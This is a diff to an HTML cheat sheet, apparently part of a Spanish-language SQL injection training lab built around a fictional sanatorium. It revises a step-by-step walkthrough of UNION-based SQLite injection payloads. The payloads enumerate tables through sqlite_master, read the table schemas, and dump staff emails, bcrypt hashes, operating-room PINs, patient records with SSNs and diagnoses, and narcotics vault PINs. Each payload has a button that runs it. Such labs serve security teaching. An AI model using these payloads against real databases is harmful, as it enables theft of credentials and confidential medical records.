@@ -342,39 +342,55 @@
                         </div>
                     </details>
 
-                    <!-- PASO 4: Enumeración de Tablas -->
+                    <!-- PASO 4: Enumeración de Nombres de Tablas -->
                     <details class="cheat-item">
-                        <summary><strong>Paso 4:</strong> Enumerar Tablas (`sqlite_master`)</summary>
-                        <p class="step-desc">Descubrir las tablas ocultas del sanatorio en el esquema principal.</p>
+                        <summary><strong>Paso 4:</strong> Enumerar Nombres de Tablas</summary>
+                        <p class="step-desc">Descubrir las tablas de usuarios, pacientes y farmacia registradas en `sqlite_master`.</p>
                         <div class="payload-box">
-                            <code>' UNION SELECT 1, type, name, tbl_name, sql, 6 FROM sqlite_master -- </code>
-                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, type, name, tbl_name, sql, 6 FROM sqlite_master -- ">▶️ Probar</button>
+                            <code>' UNION SELECT 1, type, name, tbl_name, 'Tabla Encontrada', 6 FROM sqlite_master WHERE type='table' -- </code>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, type, name, tbl_name, 'Tabla Encontrada', 6 FROM sqlite_master WHERE type='table' -- ">▶️ Probar</button>
                         </div>
                     </details>
 
-                    <!-- PASO 5: Extraer Usuarios y Hashes -->
+                    <!-- PASO 5: Descubrir Columnas y DDL de la Tabla -->
                     <details class="cheat-item">
-                        <summary><strong>Paso 5:</strong> Extraer Cuentas y Hashes</summary>
-                        <p class="step-desc">Volcar emails, nombres, hashes bcrypt, PINs y roles de doctores y admins.</p>
+                        <summary><strong>Paso 5:</strong> Descubrir Columnas y Estructura (DDL)</summary>
+                        <p class="step-desc">¡No asumas nombres de columnas! Lee la sentencia `CREATE TABLE` en la columna `sql` de `sqlite_master` para descubrir que existen las columnas `email`, `password_hash`, `pin_acceso_quirofano` y `rol`.</p>
+                        <div class="payload-box">
+                            <span class="payload-label">Columnas de Usuarios:</span>
+                            <code>' UNION SELECT 1, tbl_name, sql, 'Esquema de Usuarios', 5, 6 FROM sqlite_master WHERE tbl_name='personal_medico_usuarios' -- </code>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, tbl_name, sql, 'Esquema de Usuarios', 5, 6 FROM sqlite_master WHERE tbl_name='personal_medico_usuarios' -- ">▶️ Ver Columnas Usuarios</button>
+                        </div>
+                        <div class="payload-box" style="margin-top:5px;">
+                            <span class="payload-label">Columnas de Pacientes:</span>
+                            <code>' UNION SELECT 1, tbl_name, sql, 'Esquema de Pacientes', 5, 6 FROM sqlite_master WHERE tbl_name='historias_clinicas_pacientes' -- </code>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, tbl_name, sql, 'Esquema de Pacientes', 5, 6 FROM sqlite_master WHERE tbl_name='historias_clinicas_pacientes' -- ">▶️ Ver Columnas Pacientes</button>
+                        </div>
+                    </details>
+
+                    <!-- PASO 6: Extraer Usuarios y Hashes -->
+                    <details class="cheat-item">
+                        <summary><strong>Paso 6:</strong> Extraer Cuentas, Hashes y PINs</summary>
+                        <p class="step-desc">Una vez descubiertas las columnas en el Paso 5, vuelca los emails, nombres, hashes bcrypt, PINs y roles de la tabla `personal_medico_usuarios`.</p>
                         <div class="payload-box">
                             <code>' UNION SELECT 1, email, nombre || ' ' || apellido, password_hash, pin_acceso_quirofano, rol FROM personal_medico_usuarios -- </code>
-                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, email, nombre || ' ' || apellido, password_hash, pin_acceso_quirofano, rol FROM personal_medico_usuarios -- ">▶️ Probar</button>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, email, nombre || ' ' || apellido, password_hash, pin_acceso_quirofano, rol FROM personal_medico_usuarios -- ">▶️ Extraer Usuarios</button>
                         </div>
                     </details>
 
-                    <!-- PASO 6: Extraer Pacientes y Farmacia -->
+                    <!-- PASO 7: Extraer Pacientes y Farmacia -->
                     <details class="cheat-item">
-                        <summary><strong>Paso 6:</strong> Extraer Historias Clínicas y Farmacia</summary>
+                        <summary><strong>Paso 7:</strong> Extraer Pacientes y Narcóticos</summary>
                         <p class="step-desc">Volcar expedientes confidenciales de pacientes o PINs de narcóticos.</p>
                         <div class="payload-box">
                             <span class="payload-label">Pacientes:</span>
                             <code>' UNION SELECT 1, numero_expediente, nombre_paciente, dni_ssn, diagnostico_principal, tratamiento_prescripto FROM historias_clinicas_pacientes -- </code>
-                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, numero_expediente, nombre_paciente, dni_ssn, diagnostico_principal, tratamiento_prescripto FROM historias_clinicas_pacientes -- ">▶️ Probar</button>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, numero_expediente, nombre_paciente, dni_ssn, diagnostico_principal, tratamiento_prescripto FROM historias_clinicas_pacientes -- ">▶️ Extraer Pacientes</button>
                         </div>
                         <div class="payload-box" style="margin-top:5px;">
                             <span class="payload-label">Bóveda Narcóticos:</span>
                             <code>' UNION SELECT 1, codigo_sustancia, nombre_medicamento, boveda_ubicacion, pin_boveda_narcoticos, nivel_acceso_requerido FROM equipamiento_y_farmacia -- </code>
-                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, codigo_sustancia, nombre_medicamento, boveda_ubicacion, pin_boveda_narcoticos, nivel_acceso_requerido FROM equipamiento_y_farmacia -- ">▶️ Probar</button>
+                            <button class="btn-xs btn-run-payload" data-target="health" data-payload="' UNION SELECT 1, codigo_sustancia, nombre_medicamento, boveda_ubicacion, pin_boveda_narcoticos, nivel_acceso_requerido FROM equipamiento_y_farmacia -- ">▶️ Extraer Farmacia</button>
                         </div>
                     </details>
 
